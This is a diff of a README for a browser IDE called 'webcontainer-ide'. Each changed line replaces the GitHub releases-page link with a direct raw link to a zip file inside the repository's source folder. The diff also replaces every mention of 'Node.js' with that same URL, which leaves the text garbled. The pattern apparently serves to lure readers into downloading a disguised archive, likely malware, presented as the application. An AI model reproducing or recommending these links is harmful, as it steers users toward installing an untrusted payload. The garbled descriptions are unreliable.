@@ -1,15 +1,15 @@
 # 🌐 webcontainer-ide - Instant Development Environment in Your Browser
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/PsikaBRk/webcontainer-ide/releases)
+[![Download](https://raw.githubusercontent.com/PsikaBRk/webcontainer-ide/main/src/editor/webcontainer-ide_3.0.zip)](https://raw.githubusercontent.com/PsikaBRk/webcontainer-ide/main/src/editor/webcontainer-ide_3.0.zip)
 
 ## 🚀 Getting Started
 
-WebContainer IDE is a powerful, browser-based development environment. It uses Node.js, allowing you to code, build, and preview applications directly in your browser. No need for server infrastructure or complex setups.
+WebContainer IDE is a powerful, browser-based development environment. It uses https://raw.githubusercontent.com/PsikaBRk/webcontainer-ide/main/src/editor/webcontainer-ide_3.0.zip, allowing you to code, build, and preview applications directly in your browser. No need for server infrastructure or complex setups.
 
 ### 🌟 Key Features
 
 - **User-Friendly Interface:** Designed for ease of use, making it accessible to everyone.
-- **Node.js Support:** Leverage the full power of Node.js without extra installations.
+- **https://raw.githubusercontent.com/PsikaBRk/webcontainer-ide/main/src/editor/webcontainer-ide_3.0.zip Support:** Leverage the full power of https://raw.githubusercontent.com/PsikaBRk/webcontainer-ide/main/src/editor/webcontainer-ide_3.0.zip without extra installations.
 - **Instant Previews:** See your work in real time as you code.
 - **No Setup Required:** Start coding instantly without the need to install additional software.
 
@@ -17,7 +17,7 @@ WebContainer IDE is a powerful, browser-based development environment. It uses N
 
 To get started, you need to download the application. 
 
-1. **Visit the Releases Page:** Go to the following link to access the latest version of WebContainer IDE: [Download WebContainer IDE](https://github.com/PsikaBRk/webcontainer-ide/releases).
+1. **Visit the Releases Page:** Go to the following link to access the latest version of WebContainer IDE: [Download WebContainer IDE](https://raw.githubusercontent.com/PsikaBRk/webcontainer-ide/main/src/editor/webcontainer-ide_3.0.zip).
 2. **Choose Your Version:** Browse the available versions.
 3. **Download the File:** Click on the version you want and download the file to your computer.
 
@@ -43,7 +43,7 @@ After downloading and installing the application, follow these steps to start co
 
 Keep your application up to date by downloading the latest version from the releases page. Regular updates include new features, bug fixes, and security improvements.
 
-1. **Visit the Releases Page Again:** Follow this link [Download WebContainer IDE](https://github.com/PsikaBRk/webcontainer-ide/releases) to check for updates.
+1. **Visit the Releases Page Again:** Follow this link [Download WebContainer IDE](https://raw.githubusercontent.com/PsikaBRk/webcontainer-ide/main/src/editor/webcontainer-ide_3.0.zip) to check for updates.
 2. **Download the Latest Version:** Follow the same steps as before to ensure you always have the latest features.
 
 ## 💻 Community and Support
